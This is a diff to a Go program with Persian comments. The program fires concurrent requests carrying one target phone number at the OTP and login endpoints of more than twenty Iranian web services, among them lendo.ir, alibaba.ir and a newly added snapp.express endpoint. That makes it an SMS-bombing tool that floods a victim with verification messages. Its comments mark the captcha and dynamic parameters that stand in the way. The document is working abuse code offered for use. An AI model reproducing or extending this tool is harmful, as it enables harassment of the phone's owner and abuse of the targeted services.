@@ -260,6 +260,7 @@ func main() {
  // fafait.net - hasUser
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             "operationName": "hasUser",
             "variables": map[string]interface{}{
@@ -276,6 +277,7 @@ func main() {
     // fafait.net - with nickname
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             // operationName was not explicitly in the second fafait example, might be inferred or not needed
             // "operationName": "someOperation",
@@ -294,6 +296,7 @@ func main() {
     // tamimpishro.com
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             "mobile": phone,
             "name": "Test Name", // می‌توانید این را تغییر دهید یا تصادفی کنید
@@ -307,6 +310,7 @@ func main() {
     // gateway.telewebion.com (شامل پارامتر دینامیک g-recaptcha-response)
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             "code": "98",
             "phone": phone[1:], // حذف صفر اول اگر نیاز باشد، بر اساس نمونه
@@ -319,7 +323,8 @@ func main() {
     // app.itoll.com
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "mobile": phone,
         }
         sendJSONRequest(ctx, "https://app.itoll.com/api/v1/auth/login", payload, &wg, ch)
@@ -328,7 +333,8 @@ func main() {
     // api.lendo.ir - check-password
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "mobile": phone,
         }
         sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/check-password", payload, &wg, ch)
@@ -337,7 +343,8 @@ func main() {
     // api.lendo.ir - send-otp
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "mobile": phone,
         }
         sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/send-otp", payload, &wg, ch)
@@ -346,6 +353,7 @@ func main() {
     // api.pinorest.com (شامل پارامتر دینامیک captcha)
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             "mobile": phone,
             // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
@@ -356,7 +364,8 @@ func main() {
     // api.mobit.ir - login
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+         // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "number": phone,
         }
         sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v6/register/login", payload, &wg, ch)
@@ -365,19 +374,21 @@ func main() {
      // api.mobit.ir - register (شامل پارامترهای دینامیک hash_1, hash_2)
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             "number": phone,
              // این پارامترها دینامیک هستند و ممکن است مشکل ایجاد کنند
-            // "hash_1": 1745760096,
+            // "hash_1": 1745760096, // این یک عدد است، map[string]string قبول نمیکند
             // "hash_2": "0d6f656b3e726b9180b9572bd8c670ca79c2766d6ea60ca5b2b0fe34cc41f3eb",
         }
         sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v8/register/register", payload, &wg, ch)
     }
 
 
-    // api.vandar.io (شامل پارامتر دینامیک captcha)
+    // api.vandar.io (ش شامل پارامتر دینامیک captcha)
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             "mobile": phone,
             // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
@@ -389,7 +400,8 @@ func main() {
     // drdr.ir
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "mobile": phone,
         }
         sendJSONRequest(ctx, "https://drdr.ir/api/v3/auth/login/mobile/init/", payload, &wg, ch)
@@ -398,7 +410,8 @@ func main() {
     // azki.com
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "phoneNumber": phone,
             "origin": "www.azki.com",
         }
@@ -408,7 +421,8 @@ func main() {
     // api.epasazh.com
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "mobile": phone,
         }
         sendJSONRequest(ctx, "https://api.epasazh.com/api/v4/blind-otp", payload, &wg, ch)
@@ -417,7 +431,8 @@ func main() {
     // api.achareh.co (شامل کوئری پارامتر در URL)
     wg.Add(1)
     tasks <- func() {
-         payload := map[string]string{
+         // اصلاح نوع payload به map[string]interface{}
+         payload := map[string]interface{}{
             "phone": "98" + phone[1:], // اضافه کردن 98 و حذف صفر اول بر اساس نمونه
         }
         // کوئری پارامتر به URL اضافه می‌شود
@@ -428,7 +443,8 @@ func main() {
     // ws.alibaba.ir
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "phoneNumber": phone,
         }
         sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
@@ -437,7 +453,8 @@ func main() {
     // app.ezpay.ir
      wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "phoneNumber": phone,
             "os": "Windows",
             "osVersion": "10",
@@ -452,7 +469,8 @@ func main() {
     // api.motabare.ir
     wg.Add(1)
     tasks <- func() {
-        payload := map[string]string{
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
             "mobile": phone,
         }
         sendJSONRequest(ctx, "https://api.motabare.ir/v1/core/user/initial/", payload, &wg, ch)
@@ -461,17 +479,18 @@ func main() {
     // oteacher.org (شامل پارامترهای دینامیک client, timestamp, sign)
     wg.Add(1)
     tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
         payload := map[string]interface{}{
             // "client": "xLjNuxt%2z@", // ممکن است دینامیک باشد
             "mobile": phone,
-            // "timestamp": time.Now().UnixNano() / int64(time.Millisecond), // شاید نیاز به timestamp فعلی باشد
+            // "timestamp": time.Now().UnixNano() / int64(time.Millisecond), // شاید نیاز به timestamp فعلی باشد (عدد است)
             // "sign": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
         }
          sendJSONRequest(ctx, "https://oteacher.org/api/user/register/mobile", payload, &wg, ch)
     }
 
 
-    // اضافه کردن وظایف برای URLهای Form Data
+    // اضافه کردن وظایف برای URLهای Form Data (این قسمت نیازی به تغییر نوع payload ندارد چون Form Data همیشه کلید-مقدار رشته‌ای است)
 
     // sabziman.com (فرم موجود در کد شما)
     wg.Add(1)
@@ -674,6 +693,30 @@ func main() {
         // formData.Set("dig_nounce", "DYNAMIC_VALUE") // دینامیک
         sendFormRequest(ctx, "https://nazarkade.com/wp-admin/admin-ajax.php", formData, &wg, ch)
     }
+
+    // api.snapp.express (شامل پارامترهای دینامیک و کوئری پارامتر در URL)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("cellphone", phone)
+        formData.Set("client", "PWA") // اینها ممکن است ثابت باشند
+        formData.Set("optionalClient", "PWA")
+        formData.Set("deviceType", "PWA")
+        formData.Set("appVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
+        formData.Set("clientVersion", "a4547bd9") // ممکن است نیاز به بروزرسانی داشته باشد
+        formData.Set("optionalVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
+        // formData.Set("UDID", "DYNAMIC_VALUE") // دینامیک
+        // formData.Set("sessionId", "DYNAMIC_VALUE") // دینامیک
+        formData.Set("lat", "35.774") // ممکن است نیاز به تغییر داشته باشد
+        formData.Set("long", "51.418") // ممکن است نیاز به تغییر داشته باشد
+        // formData.Set("captcha", "DYNAMIC_VALUE") // دینامیک
+        formData.Set("optionalLoginToken", "true") // ممکن است ثابت باشد
+
+        // کوئری پارامترها در URL هم وجود دارند که با این تابع sendFormRequest ارسال می شوند
+        urlWithQuery := "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&sessionId=dc36a2df-587e-412f-96cd-d483d58e3daf&lat=35.774&long=51.418"
+        sendFormRequest(ctx, urlWithQuery, formData, &wg, ch)
+    }
+
 
 
 	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---
